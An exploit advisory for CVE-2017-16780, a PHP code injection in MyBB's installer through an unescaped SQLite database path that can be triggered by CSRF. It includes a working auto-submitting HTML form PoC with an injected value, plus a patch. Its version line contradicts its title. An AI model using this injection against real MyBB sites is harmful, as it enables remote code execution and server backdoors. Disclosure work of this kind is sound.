@@ -1,0 +1,32 @@
+# Exploit Title: RCE in MyBB up to 1.8.13 via installer
+# Date: Found on 05-29-2017
+# Exploit Author: Pablo Sacristan
+# Vendor Homepage: https://mybb.com/
+# Version: Version > 1.8.13 (Fixed in 1.8.13)
+# CVE : CVE-2017-16780
+
+This RCE can be executed via CSRF but doesn't require it (in some special cases). The requirements are there shouldn't be a lock in the /install/ directory and then if you have access to the install directory you don't need CSRF, but if you don't then you need CSRF. I have included a patch and a description. The exploit will write PHP code to /inc/config.php which is then 'REQUIRE'd in most of the pages in MyBB, the PoC will just write lollol to the top of every page in MyBB. I also have an XSS but that I will report later.
+
+There is a CSRF vulnerability in MyBB /install/index.php which can be used to inject PHP code into /inc/config.php which is then used in most of the pages (require MYBB_ROOT."/inc/config.php" is in most of the pages). 
+  
+The vulnerability exists in the table creation process for sqlite databases, this is because the Database Path is then inserted into the /inc/config.php file in line 11 as $config['database']['database'] = 'DB Path';
+ 
+The vulnerability occurs because MyBB doesn't properly escape the Database Path, allowing an attacker to easily inject PHP by inserting a DB Path of : lol'; echo 'lol     this will not cause any parse errors since there will be a : ';    added at the end. Of course the attacker can easily just execute code in the server, getting backdoor access to the server easily.
+ 
+A PoC would be to host a site like this:
+<form name="x" action="http://localhost/install/index.php" method="post">
+    
+<input type="hidden" name='dbengine' value="sqlite">
+<input type="hidden" name='config[sqlite][dbname]' value="lol'; echo 'lol">
+<input type="hidden" name='config[sqlite][tableprefix]' value="mybb_">
+<input type="hidden" name='action' value="create_tables">
+                                        
+</form>
+ 
+<script>document.x.submit();</script>
+ 
+ 
+And when a victim logged in as admin to a MyBB website visits this site they will have a "lollol" at the top of every page (or you can also make it do much more malicious things).
+ 
+A simple patch would be to change /install/index.php:1410 to:
+if(strstr($config['dbname'], "./") !== false || strstr($config['dbname'], "../") !== false || strstr($config['dbname'], "'") !== false || empty($config['dbname']))
